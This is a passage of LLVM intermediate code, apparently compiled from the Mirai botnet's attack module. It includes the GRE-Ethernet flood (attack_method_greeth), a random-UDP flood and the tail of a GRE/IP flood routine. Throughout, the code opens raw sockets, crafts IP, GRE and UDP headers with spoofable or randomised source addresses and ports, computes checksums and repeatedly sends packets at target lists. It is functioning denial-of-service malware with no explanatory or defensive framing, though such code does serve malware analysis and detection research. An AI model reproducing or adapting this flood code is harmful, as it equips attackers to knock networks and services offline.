; <label>:80:                                     ; preds = %76, %61
  %81 = getelementptr inbounds i8, i8* %62, i64 9
  store i8 47, i8* %81, align 1
  %82 = getelementptr inbounds i8, i8* %62, i64 12
  %83 = bitcast i8* %82 to i32*
  store i32 %27, i32* %83, align 4
  %84 = load i32, i32* %5, align 4
  %85 = sext i32 %84 to i64
  %86 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %85, i32 1
  %87 = load i32, i32* %86, align 4
  %88 = getelementptr inbounds i8, i8* %62, i64 16
  %89 = bitcast i8* %88 to i32*
  store i32 %87, i32* %89, align 4
  %90 = call zeroext i16 @htons(i16 zeroext 2048) #8
  %91 = getelementptr inbounds i8, i8* %62, i64 22
  %92 = bitcast i8* %91 to i16*
  store i16 %90, i16* %92, align 2
  store i8 69, i8* %66, align 4
  %93 = getelementptr inbounds i8, i8* %62, i64 25
  store i8 %10, i8* %93, align 1
  %94 = call zeroext i16 @htons(i16 zeroext %41) #8
  %95 = getelementptr inbounds i8, i8* %62, i64 26
  %96 = bitcast i8* %95 to i16*
  store i16 %94, i16* %96, align 2
  %97 = call zeroext i16 @htons(i16 zeroext %42) #8
  %98 = getelementptr inbounds i8, i8* %62, i64 28
  %99 = bitcast i8* %98 to i16*
  store i16 %97, i16* %99, align 4
  %100 = getelementptr inbounds i8, i8* %62, i64 32
  store i8 %14, i8* %100, align 4
  br i1 %39, label %101, label %105

; <label>:101:                                    ; preds = %80
  %102 = call zeroext i16 @htons(i16 zeroext 16384) #8
  %103 = getelementptr inbounds i8, i8* %62, i64 30
  %104 = bitcast i8* %103 to i16*
  store i16 %102, i16* %104, align 2
  br label %105

; <label>:105:                                    ; preds = %101, %80
  %106 = getelementptr inbounds i8, i8* %62, i64 33
  store i8 17, i8* %106, align 1
  %107 = call i32 @rand_next() #7
  %108 = getelementptr inbounds i8, i8* %62, i64 36
  %109 = bitcast i8* %108 to i32*
  store i32 %107, i32* %109, align 4
  br i1 %43, label %112, label %110

; <label>:110:                                    ; preds = %105
  %111 = load i32, i32* %89, align 4
  br label %114

; <label>:112:                                    ; preds = %105
  %113 = sub i32 1023, %107
  br label %114

; <label>:114:                                    ; preds = %112, %110
  %.sink = phi i32 [ %113, %112 ], [ %111, %110 ]
  %115 = getelementptr inbounds i8, i8* %62, i64 40
  %116 = bitcast i8* %115 to i32*
  store i32 %.sink, i32* %116, align 4
  %117 = call zeroext i16 @htons(i16 zeroext %18) #8
  %118 = bitcast i8* %67 to i16*
  store i16 %117, i16* %118, align 2
  %119 = call zeroext i16 @htons(i16 zeroext %20) #8
  %120 = getelementptr inbounds i8, i8* %62, i64 46
  %121 = bitcast i8* %120 to i16*
  store i16 %119, i16* %121, align 2
  %122 = call zeroext i16 @htons(i16 zeroext %45) #8
  %123 = getelementptr inbounds i8, i8* %62, i64 48
  %124 = bitcast i8* %123 to i16*
  store i16 %122, i16* %124, align 2
  %125 = load i32, i32* %5, align 4
  %126 = add nsw i32 %125, 1
  store i32 %126, i32* %5, align 4
  %127 = icmp slt i32 %126, %34
  br i1 %127, label %61, label %.preheader.loopexit

.loopexit.loopexit:                               ; preds = %190
  br label %.loopexit.backedge

.loopexit:                                        ; preds = %.loopexit.backedge, %.preheader
  store i32 0, i32* %5, align 4
  br i1 %48, label %.loopexit.backedge, label %.lr.ph.preheader

.loopexit.backedge:                               ; preds = %.loopexit, %.loopexit.loopexit
  br label %.loopexit

.lr.ph.preheader:                                 ; preds = %.loopexit
  br label %.lr.ph

.lr.ph:                                           ; preds = %.lr.ph.preheader, %190
  %storemerge124126 = phi i32 [ %220, %190 ], [ 0, %.lr.ph.preheader ]
  %128 = sext i32 %storemerge124126 to i64
  %129 = getelementptr inbounds i8*, i8** %8, i64 %128
  %130 = load i8*, i8** %129, align 8
  %131 = getelementptr inbounds i8, i8* %130, i64 24
  %132 = bitcast i8* %131 to %struct.iphdr*
  %133 = getelementptr inbounds i8, i8* %130, i64 44
  %134 = getelementptr inbounds i8, i8* %130, i64 52
  %135 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %128, i32 2
  %136 = load i8, i8* %135, align 4
  %137 = icmp ult i8 %136, 32
  br i1 %137, label %138, label %153

; <label>:138:                                    ; preds = %.lr.ph
  %139 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %128, i32 1
  %140 = load i32, i32* %139, align 4
  %141 = call i32 @ntohl(i32 %140) #8
  %142 = call i32 @rand_next() #7
  %143 = load i32, i32* %5, align 4
  %144 = sext i32 %143 to i64
  %145 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %144, i32 2
  %146 = load i8, i8* %145, align 4
  %147 = zext i8 %146 to i32
  %148 = lshr i32 %142, %147
  %149 = add i32 %148, %141
  %150 = call i32 @htonl(i32 %149) #8
  %151 = getelementptr inbounds i8, i8* %130, i64 16
  %152 = bitcast i8* %151 to i32*
  store i32 %150, i32* %152, align 4
  br label %153

; <label>:153:                                    ; preds = %138, %.lr.ph
  br i1 %49, label %154, label %158

; <label>:154:                                    ; preds = %153
  %155 = call i32 @rand_next() #7
  %156 = getelementptr inbounds i8, i8* %130, i64 12
  %157 = bitcast i8* %156 to i32*
  store i32 %155, i32* %157, align 4
  br label %158

; <label>:158:                                    ; preds = %154, %153
  br i1 %51, label %159, label %168

; <label>:159:                                    ; preds = %158
  %160 = call i32 @rand_next() #7
  %161 = trunc i32 %160 to i16
  %162 = getelementptr inbounds i8, i8* %130, i64 4
  %163 = bitcast i8* %162 to i16*
  store i16 %161, i16* %163, align 4
  %164 = sub i32 999, %160
  %165 = trunc i32 %164 to i16
  %166 = getelementptr inbounds i8, i8* %130, i64 28
  %167 = bitcast i8* %166 to i16*
  store i16 %165, i16* %167, align 4
  br label %168

; <label>:168:                                    ; preds = %159, %158
  br i1 %53, label %169, label %173

; <label>:169:                                    ; preds = %168
  %170 = call i32 @rand_next() #7
  %171 = trunc i32 %170 to i16
  %172 = bitcast i8* %133 to i16*
  store i16 %171, i16* %172, align 2
  br label %173

; <label>:173:                                    ; preds = %169, %168
  br i1 %55, label %174, label %179

; <label>:174:                                    ; preds = %173
  %175 = call i32 @rand_next() #7
  %176 = trunc i32 %175 to i16
  %177 = getelementptr inbounds i8, i8* %130, i64 46
  %178 = bitcast i8* %177 to i16*
  store i16 %176, i16* %178, align 2
  br label %179

; <label>:179:                                    ; preds = %174, %173
  br i1 %56, label %180, label %182

; <label>:180:                                    ; preds = %179
  %181 = call i32 @rand_next() #7
  br label %186

; <label>:182:                                    ; preds = %179
  %183 = getelementptr inbounds i8, i8* %130, i64 16
  %184 = bitcast i8* %183 to i32*
  %185 = load i32, i32* %184, align 4
  br label %186

; <label>:186:                                    ; preds = %182, %180
  %.sink3 = phi i32 [ %185, %182 ], [ %181, %180 ]
  %187 = getelementptr inbounds i8, i8* %130, i64 40
  %188 = bitcast i8* %187 to i32*
  store i32 %.sink3, i32* %188, align 4
  br i1 %57, label %190, label %189

; <label>:189:                                    ; preds = %186
  call void @rand_str(i8* nonnull %134, i32 %21) #7
  br label %190

; <label>:190:                                    ; preds = %186, %189
  %191 = getelementptr inbounds i8, i8* %130, i64 10
  %192 = bitcast i8* %191 to i16*
  store i16 0, i16* %192, align 2
  %193 = bitcast i8* %130 to i16*
  %194 = call zeroext i16 @checksum_generic(i16* %193, i32 20) #7
  store i16 %194, i16* %192, align 2
  %195 = getelementptr inbounds i8, i8* %130, i64 34
  %196 = bitcast i8* %195 to i16*
  store i16 0, i16* %196, align 2
  %197 = bitcast i8* %131 to i16*
  %198 = call zeroext i16 @checksum_generic(i16* %197, i32 20) #7
  store i16 %198, i16* %196, align 2
  %199 = getelementptr inbounds i8, i8* %130, i64 50
  %200 = bitcast i8* %199 to i16*
  store i16 0, i16* %200, align 2
  %201 = getelementptr inbounds i8, i8* %130, i64 48
  %202 = bitcast i8* %201 to i16*
  %203 = load i16, i16* %202, align 2
  %204 = call zeroext i16 @checksum_tcpudp(%struct.iphdr* nonnull %132, i8* nonnull %133, i16 zeroext %203, i32 %59) #7
  store i16 %204, i16* %200, align 2
  %205 = load i32, i32* %5, align 4
  %206 = sext i32 %205 to i64
  %207 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %206, i32 0, i32 0
  store i16 2, i16* %207, align 4
  %208 = getelementptr inbounds i8, i8* %130, i64 16
  %209 = bitcast i8* %208 to i32*
  %210 = load i32, i32* %209, align 4
  %211 = load i32, i32* %5, align 4
  %212 = sext i32 %211 to i64
  %213 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %212, i32 0, i32 2, i32 0
  store i32 %210, i32* %213, align 4
  %214 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %212, i32 0, i32 1
  store i16 0, i16* %214, align 2
  %215 = sext i32 %211 to i64
  %216 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %215, i32 0
  %217 = bitcast %struct.sockaddr_in* %216 to %struct.sockaddr*
  %218 = call i64 @sendto(i32 %28, i8* nonnull %130, i64 %60, i32 16384, %struct.sockaddr* %217, i32 16) #7
  %219 = load i32, i32* %5, align 4
  %220 = add nsw i32 %219, 1
  store i32 %220, i32* %5, align 4
  %221 = icmp slt i32 %220, %34
  br i1 %221, label %.lr.ph, label %.loopexit.loopexit

; <label>:222:                                    ; preds = %4, %46
  ret void
}

; Function Attrs: noinline nounwind uwtable
define void @attack_method_greeth(i8 zeroext, %struct.attack_target*, i8 zeroext, %struct.attack_option* nocapture readonly) #0 {
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = zext i8 %0 to i64
  %10 = tail call noalias i8* @calloc(i64 %9, i64 8) #7
  %11 = bitcast i8* %10 to i8**
  %12 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 2, i32 0)
  %13 = trunc i32 %12 to i8
  %14 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 3, i32 65535)
  %15 = trunc i32 %14 to i16
  %16 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 4, i32 64)
  %17 = trunc i32 %16 to i8
  %18 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 5, i32 1)
  %19 = trunc i32 %18 to i8
  %20 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 6, i32 65535)
  %21 = trunc i32 %20 to i16
  %22 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 7, i32 65535)
  %23 = trunc i32 %22 to i16
  %24 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 0, i32 1458)
  %25 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 1, i32 1)
  %26 = trunc i32 %25 to i8
  %27 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 19, i32 0)
  %28 = trunc i32 %27 to i8
  %29 = load i32, i32* @LOCAL_ADDR, align 4
  %30 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 25, i32 %29)
  %31 = tail call i32 @socket(i32 2, i32 3, i32 6) #7
  %32 = icmp eq i32 %31, -1
  br i1 %32, label %239, label %33

; <label>:33:                                     ; preds = %4
  store i32 1, i32* %5, align 4
  %34 = bitcast i32* %5 to i8*
  %35 = call i32 @setsockopt(i32 %31, i32 0, i32 3, i8* nonnull %34, i32 4) #7
  %36 = icmp eq i32 %35, -1
  br i1 %36, label %49, label %.preheader132

.preheader132:                                    ; preds = %33
  store i32 0, i32* %5, align 4
  %37 = zext i8 %0 to i32
  %38 = icmp eq i8 %0, 0
  br i1 %38, label %.preheader, label %.lr.ph134

.lr.ph134:                                        ; preds = %.preheader132
  %39 = sext i32 %24 to i64
  %40 = add nsw i64 %39, 66
  %41 = trunc i64 %40 to i16
  %42 = icmp ne i8 %19, 0
  %43 = add nsw i64 %39, 28
  %44 = trunc i64 %43 to i16
  %45 = xor i16 %15, -1
  %46 = icmp eq i8 %28, 0
  %47 = add nsw i64 %39, 8
  %48 = trunc i64 %47 to i16
  br label %68

; <label>:49:                                     ; preds = %33
  %50 = call i32 @close(i32 %31) #7
  br label %239

.preheader.loopexit:                              ; preds = %124
  br label %.preheader

.preheader:                                       ; preds = %.preheader.loopexit, %.preheader132
  %51 = icmp eq i8 %0, 0
  %52 = icmp eq i32 %30, -1
  %53 = and i32 %14, 65535
  %54 = icmp eq i32 %53, 65535
  %55 = and i32 %20, 65535
  %56 = icmp eq i32 %55, 65535
  %57 = and i32 %22, 65535
  %58 = icmp eq i32 %57, 65535
  %59 = icmp eq i8 %28, 0
  %60 = bitcast i32* %6 to i8*
  %61 = bitcast i32* %7 to i8*
  %62 = bitcast i32* %8 to i8*
  %63 = getelementptr inbounds i8, i8* %62, i64 2
  %64 = icmp eq i8 %26, 0
  %65 = sext i32 %24 to i64
  %66 = add i32 %24, 8
  %67 = add nsw i64 %65, 66
  br label %.loopexit

; <label>:68:                                     ; preds = %.lr.ph134, %124
  %69 = call noalias i8* @calloc(i64 1458, i64 8) #7
  %70 = load i32, i32* %5, align 4
  %71 = sext i32 %70 to i64
  %72 = getelementptr inbounds i8*, i8** %11, i64 %71
  store i8* %69, i8** %72, align 8
  %73 = getelementptr inbounds i8, i8* %69, i64 38
  %74 = getelementptr inbounds i8, i8* %69, i64 58
  store i8 69, i8* %69, align 4
  %75 = getelementptr inbounds i8, i8* %69, i64 1
  store i8 %13, i8* %75, align 1
  %76 = call zeroext i16 @htons(i16 zeroext %41) #8
  %77 = getelementptr inbounds i8, i8* %69, i64 2
  %78 = bitcast i8* %77 to i16*
  store i16 %76, i16* %78, align 2
  %79 = call zeroext i16 @htons(i16 zeroext %15) #8
  %80 = getelementptr inbounds i8, i8* %69, i64 4
  %81 = bitcast i8* %80 to i16*
  store i16 %79, i16* %81, align 4
  %82 = getelementptr inbounds i8, i8* %69, i64 8
  store i8 %17, i8* %82, align 4
  br i1 %42, label %83, label %87

; <label>:83:                                     ; preds = %68
  %84 = call zeroext i16 @htons(i16 zeroext 16384) #8
  %85 = getelementptr inbounds i8, i8* %69, i64 6
  %86 = bitcast i8* %85 to i16*
  store i16 %84, i16* %86, align 2
  br label %87

; <label>:87:                                     ; preds = %83, %68
  %88 = getelementptr inbounds i8, i8* %69, i64 9
  store i8 47, i8* %88, align 1
  %89 = getelementptr inbounds i8, i8* %69, i64 12
  %90 = bitcast i8* %89 to i32*
  store i32 %30, i32* %90, align 4
  %91 = load i32, i32* %5, align 4
  %92 = sext i32 %91 to i64
  %93 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %92, i32 1
  %94 = load i32, i32* %93, align 4
  %95 = getelementptr inbounds i8, i8* %69, i64 16
  %96 = bitcast i8* %95 to i32*
  store i32 %94, i32* %96, align 4
  %97 = call zeroext i16 @htons(i16 zeroext 25944) #8
  %98 = getelementptr inbounds i8, i8* %69, i64 22
  %99 = bitcast i8* %98 to i16*
  store i16 %97, i16* %99, align 2
  %100 = call zeroext i16 @htons(i16 zeroext 2048) #8
  %101 = getelementptr inbounds i8, i8* %69, i64 36
  %102 = bitcast i8* %101 to i16*
  store i16 %100, i16* %102, align 1
  store i8 69, i8* %73, align 4
  %103 = getelementptr inbounds i8, i8* %69, i64 39
  store i8 %13, i8* %103, align 1
  %104 = call zeroext i16 @htons(i16 zeroext %44) #8
  %105 = getelementptr inbounds i8, i8* %69, i64 40
  %106 = bitcast i8* %105 to i16*
  store i16 %104, i16* %106, align 2
  %107 = call zeroext i16 @htons(i16 zeroext %45) #8
  %108 = getelementptr inbounds i8, i8* %69, i64 42
  %109 = bitcast i8* %108 to i16*
  store i16 %107, i16* %109, align 4
  %110 = getelementptr inbounds i8, i8* %69, i64 46
  store i8 %17, i8* %110, align 4
  br i1 %42, label %111, label %115

; <label>:111:                                    ; preds = %87
  %112 = call zeroext i16 @htons(i16 zeroext 16384) #8
  %113 = getelementptr inbounds i8, i8* %69, i64 44
  %114 = bitcast i8* %113 to i16*
  store i16 %112, i16* %114, align 2
  br label %115

; <label>:115:                                    ; preds = %111, %87
  %116 = getelementptr inbounds i8, i8* %69, i64 47
  store i8 17, i8* %116, align 1
  %117 = call i32 @rand_next() #7
  %118 = getelementptr inbounds i8, i8* %69, i64 50
  %119 = bitcast i8* %118 to i32*
  store i32 %117, i32* %119, align 4
  br i1 %46, label %122, label %120

; <label>:120:                                    ; preds = %115
  %121 = load i32, i32* %96, align 4
  br label %124

; <label>:122:                                    ; preds = %115
  %123 = sub i32 1023, %117
  br label %124

; <label>:124:                                    ; preds = %122, %120
  %.sink = phi i32 [ %123, %122 ], [ %121, %120 ]
  %125 = getelementptr inbounds i8, i8* %69, i64 54
  %126 = bitcast i8* %125 to i32*
  store i32 %.sink, i32* %126, align 4
  %127 = call zeroext i16 @htons(i16 zeroext %21) #8
  %128 = bitcast i8* %74 to i16*
  store i16 %127, i16* %128, align 2
  %129 = call zeroext i16 @htons(i16 zeroext %23) #8
  %130 = getelementptr inbounds i8, i8* %69, i64 60
  %131 = bitcast i8* %130 to i16*
  store i16 %129, i16* %131, align 2
  %132 = call zeroext i16 @htons(i16 zeroext %48) #8
  %133 = getelementptr inbounds i8, i8* %69, i64 62
  %134 = bitcast i8* %133 to i16*
  store i16 %132, i16* %134, align 2
  %135 = load i32, i32* %5, align 4
  %136 = add nsw i32 %135, 1
  store i32 %136, i32* %5, align 4
  %137 = icmp slt i32 %136, %37
  br i1 %137, label %68, label %.preheader.loopexit

.loopexit.loopexit:                               ; preds = %207
  br label %.loopexit.backedge

.loopexit:                                        ; preds = %.loopexit.backedge, %.preheader
  store i32 0, i32* %5, align 4
  br i1 %51, label %.loopexit.backedge, label %.lr.ph.preheader

.loopexit.backedge:                               ; preds = %.loopexit, %.loopexit.loopexit
  br label %.loopexit

.lr.ph.preheader:                                 ; preds = %.loopexit
  br label %.lr.ph

.lr.ph:                                           ; preds = %.lr.ph.preheader, %207
  %storemerge131133 = phi i32 [ %237, %207 ], [ 0, %.lr.ph.preheader ]
  %138 = sext i32 %storemerge131133 to i64
  %139 = getelementptr inbounds i8*, i8** %11, i64 %138
  %140 = load i8*, i8** %139, align 8
  %141 = getelementptr inbounds i8, i8* %140, i64 24
  %142 = getelementptr inbounds i8, i8* %140, i64 38
  %143 = bitcast i8* %142 to %struct.iphdr*
  %144 = getelementptr inbounds i8, i8* %140, i64 58
  %145 = getelementptr inbounds i8, i8* %140, i64 66
  %146 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %138, i32 2
  %147 = load i8, i8* %146, align 4
  %148 = icmp ult i8 %147, 32
  br i1 %148, label %149, label %164

; <label>:149:                                    ; preds = %.lr.ph
  %150 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %138, i32 1
  %151 = load i32, i32* %150, align 4
  %152 = call i32 @ntohl(i32 %151) #8
  %153 = call i32 @rand_next() #7
  %154 = load i32, i32* %5, align 4
  %155 = sext i32 %154 to i64
  %156 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %155, i32 2
  %157 = load i8, i8* %156, align 4
  %158 = zext i8 %157 to i32
  %159 = lshr i32 %153, %158
  %160 = add i32 %159, %152
  %161 = call i32 @htonl(i32 %160) #8
  %162 = getelementptr inbounds i8, i8* %140, i64 16
  %163 = bitcast i8* %162 to i32*
  store i32 %161, i32* %163, align 4
  br label %164

; <label>:164:                                    ; preds = %149, %.lr.ph
  br i1 %52, label %165, label %169

; <label>:165:                                    ; preds = %164
  %166 = call i32 @rand_next() #7
  %167 = getelementptr inbounds i8, i8* %140, i64 12
  %168 = bitcast i8* %167 to i32*
  store i32 %166, i32* %168, align 4
  br label %169

; <label>:169:                                    ; preds = %165, %164
  br i1 %54, label %170, label %179

; <label>:170:                                    ; preds = %169
  %171 = call i32 @rand_next() #7
  %172 = trunc i32 %171 to i16
  %173 = getelementptr inbounds i8, i8* %140, i64 4
  %174 = bitcast i8* %173 to i16*
  store i16 %172, i16* %174, align 4
  %175 = sub i32 999, %171
  %176 = trunc i32 %175 to i16
  %177 = getelementptr inbounds i8, i8* %140, i64 42
  %178 = bitcast i8* %177 to i16*
  store i16 %176, i16* %178, align 4
  br label %179

; <label>:179:                                    ; preds = %170, %169
  br i1 %56, label %180, label %184

; <label>:180:                                    ; preds = %179
  %181 = call i32 @rand_next() #7
  %182 = trunc i32 %181 to i16
  %183 = bitcast i8* %144 to i16*
  store i16 %182, i16* %183, align 2
  br label %184

; <label>:184:                                    ; preds = %180, %179
  br i1 %58, label %185, label %190

; <label>:185:                                    ; preds = %184
  %186 = call i32 @rand_next() #7
  %187 = trunc i32 %186 to i16
  %188 = getelementptr inbounds i8, i8* %140, i64 60
  %189 = bitcast i8* %188 to i16*
  store i16 %187, i16* %189, align 2
  br label %190

; <label>:190:                                    ; preds = %185, %184
  br i1 %59, label %191, label %193

; <label>:191:                                    ; preds = %190
  %192 = call i32 @rand_next() #7
  br label %197

; <label>:193:                                    ; preds = %190
  %194 = getelementptr inbounds i8, i8* %140, i64 16
  %195 = bitcast i8* %194 to i32*
  %196 = load i32, i32* %195, align 4
  br label %197

; <label>:197:                                    ; preds = %193, %191
  %.sink3 = phi i32 [ %196, %193 ], [ %192, %191 ]
  %198 = getelementptr inbounds i8, i8* %140, i64 54
  %199 = bitcast i8* %198 to i32*
  store i32 %.sink3, i32* %199, align 4
  %200 = call i32 @rand_next() #7
  store i32 %200, i32* %6, align 4
  %201 = call i32 @rand_next() #7
  store i32 %201, i32* %7, align 4
  %202 = call i32 @rand_next() #7
  store i32 %202, i32* %8, align 4
  call void @util_memcpy(i8* %141, i8* nonnull %60, i32 4) #7
  %203 = getelementptr inbounds i8, i8* %140, i64 30
  call void @util_memcpy(i8* %203, i8* nonnull %61, i32 4) #7
  %204 = getelementptr inbounds i8, i8* %140, i64 28
  call void @util_memcpy(i8* %204, i8* nonnull %62, i32 2) #7
  %205 = getelementptr inbounds i8, i8* %140, i64 34
  call void @util_memcpy(i8* %205, i8* %63, i32 2) #7
  br i1 %64, label %207, label %206

; <label>:206:                                    ; preds = %197
  call void @rand_str(i8* nonnull %145, i32 %24) #7
  br label %207

; <label>:207:                                    ; preds = %197, %206
  %208 = getelementptr inbounds i8, i8* %140, i64 10
  %209 = bitcast i8* %208 to i16*
  store i16 0, i16* %209, align 2
  %210 = bitcast i8* %140 to i16*
  %211 = call zeroext i16 @checksum_generic(i16* %210, i32 20) #7
  store i16 %211, i16* %209, align 2
  %212 = getelementptr inbounds i8, i8* %140, i64 48
  %213 = bitcast i8* %212 to i16*
  store i16 0, i16* %213, align 2
  %214 = bitcast i8* %142 to i16*
  %215 = call zeroext i16 @checksum_generic(i16* %214, i32 20) #7
  store i16 %215, i16* %213, align 2
  %216 = getelementptr inbounds i8, i8* %140, i64 64
  %217 = bitcast i8* %216 to i16*
  store i16 0, i16* %217, align 2
  %218 = getelementptr inbounds i8, i8* %140, i64 62
  %219 = bitcast i8* %218 to i16*
  %220 = load i16, i16* %219, align 2
  %221 = call zeroext i16 @checksum_tcpudp(%struct.iphdr* nonnull %143, i8* nonnull %144, i16 zeroext %220, i32 %66) #7
  store i16 %221, i16* %217, align 2
  %222 = load i32, i32* %5, align 4
  %223 = sext i32 %222 to i64
  %224 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %223, i32 0, i32 0
  store i16 2, i16* %224, align 4
  %225 = getelementptr inbounds i8, i8* %140, i64 16
  %226 = bitcast i8* %225 to i32*
  %227 = load i32, i32* %226, align 4
  %228 = load i32, i32* %5, align 4
  %229 = sext i32 %228 to i64
  %230 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %229, i32 0, i32 2, i32 0
  store i32 %227, i32* %230, align 4
  %231 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %229, i32 0, i32 1
  store i16 0, i16* %231, align 2
  %232 = sext i32 %228 to i64
  %233 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %232, i32 0
  %234 = bitcast %struct.sockaddr_in* %233 to %struct.sockaddr*
  %235 = call i64 @sendto(i32 %31, i8* nonnull %140, i64 %67, i32 16384, %struct.sockaddr* %234, i32 16) #7
  %236 = load i32, i32* %5, align 4
  %237 = add nsw i32 %236, 1
  store i32 %237, i32* %5, align 4
  %238 = icmp slt i32 %237, %37
  br i1 %238, label %.lr.ph, label %.loopexit.loopexit

; <label>:239:                                    ; preds = %4, %49
  ret void
}

; Function Attrs: noinline nounwind uwtable
define void @attack_method_udprandom(i8 zeroext, %struct.attack_target*, i8 zeroext, %struct.attack_option* nocapture readonly) #0 {
  %5 = alloca i32, align 4
  %6 = zext i8 %0 to i64
  %7 = tail call noalias i8* @calloc(i64 %6, i64 8) #7
  %8 = bitcast i8* %7 to i8**
  %9 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 2, i32 0)
  %10 = trunc i32 %9 to i8
  %11 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 3, i32 65535)
  %12 = trunc i32 %11 to i16
  %13 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 4, i32 64)
  %14 = trunc i32 %13 to i8
  %15 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 5, i32 0)
  %16 = trunc i32 %15 to i8
  %17 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 6, i32 65535)
  %18 = trunc i32 %17 to i16
  %19 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 7, i32 65535)
  %20 = trunc i32 %19 to i16
  %21 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 0, i32 1458)
  %22 = trunc i32 %21 to i16
  %23 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 1, i32 1)
  %24 = trunc i32 %23 to i8
  %25 = load i32, i32* @LOCAL_ADDR, align 4
  %26 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 25, i32 %25)
  %27 = and i32 %21, 65535
  %28 = icmp ugt i32 %27, 1458
  %. = select i1 %28, i16 1458, i16 %22
  %29 = tail call i32 @socket(i32 2, i32 3, i32 17) #7
  %30 = icmp eq i32 %29, -1
  br i1 %30, label %169, label %31

; <label>:31:                                     ; preds = %4
  store i32 1, i32* %5, align 4
  %32 = bitcast i32* %5 to i8*
  %33 = call i32 @setsockopt(i32 %29, i32 0, i32 3, i8* nonnull %32, i32 4) #7
  %34 = icmp eq i32 %33, -1
  br i1 %34, label %42, label %.preheader83

.preheader83:                                     ; preds = %31
  store i32 0, i32* %5, align 4
  %35 = zext i8 %0 to i32
  %36 = icmp eq i8 %0, 0
  br i1 %36, label %.preheader, label %.lr.ph85

.lr.ph85:                                         ; preds = %.preheader83
  %37 = add i16 %., 28
  %38 = icmp eq i8 %16, 0
  %39 = add i16 %., 8
  %.promoted = load i32, i32* %5, align 4
  %40 = sext i32 %.promoted to i64
  %41 = zext i8 %0 to i64
  br label %59

; <label>:42:                                     ; preds = %31
  %43 = call i32 @close(i32 %29) #7
  br label %169

..preheader_crit_edge:                            ; preds = %75
  %44 = trunc i64 %indvars.iv.next to i32
  store i32 %44, i32* %5, align 4
  br label %.preheader

.preheader:                                       ; preds = %.preheader83, %..preheader_crit_edge
  %45 = icmp eq i8 %0, 0
  %46 = icmp eq i32 %26, -1
  %47 = and i32 %11, 65535
  %48 = icmp eq i32 %47, 65535
  %49 = and i32 %17, 65535
  %50 = icmp eq i32 %49, 65535
  %51 = and i32 %19, 65535
  %52 = icmp eq i32 %51, 65535
  %53 = icmp eq i8 %24, 0
  %54 = zext i16 %. to i64
  %55 = add nuw nsw i64 %54, 8
  %56 = trunc i64 %55 to i32
  %57 = add nuw nsw i64 %54, 28
  %58 = zext i16 %. to i32
  br label %.loopexit

; <label>:59:                                     ; preds = %.lr.ph85, %75
  %indvars.iv = phi i64 [ %40, %.lr.ph85 ], [ %indvars.iv.next, %75 ]
  %60 = call noalias i8* @calloc(i64 1458, i64 1) #7
  %61 = getelementptr inbounds i8*, i8** %8, i64 %indvars.iv
  store i8* %60, i8** %61, align 8
  %62 = getelementptr inbounds i8, i8* %60, i64 20
  store i8 69, i8* %60, align 4
  %63 = getelementptr inbounds i8, i8* %60, i64 1
  store i8 %10, i8* %63, align 1
  %64 = call zeroext i16 @htons(i16 zeroext %37) #8
  %65 = getelementptr inbounds i8, i8* %60, i64 2
  %66 = bitcast i8* %65 to i16*
  store i16 %64, i16* %66, align 2
  %67 = call zeroext i16 @htons(i16 zeroext %12) #8
  %68 = getelementptr inbounds i8, i8* %60, i64 4
  %69 = bitcast i8* %68 to i16*
  store i16 %67, i16* %69, align 4
  %70 = getelementptr inbounds i8, i8* %60, i64 8
  store i8 %14, i8* %70, align 4
  br i1 %38, label %75, label %71

; <label>:71:                                     ; preds = %59
  %72 = call zeroext i16 @htons(i16 zeroext 16384) #8
  %73 = getelementptr inbounds i8, i8* %60, i64 6
  %74 = bitcast i8* %73 to i16*
  store i16 %72, i16* %74, align 2
  br label %75

; <label>:75:                                     ; preds = %59, %71
  %76 = getelementptr inbounds i8, i8* %60, i64 9
  store i8 17, i8* %76, align 1
  %77 = getelementptr inbounds i8, i8* %60, i64 12
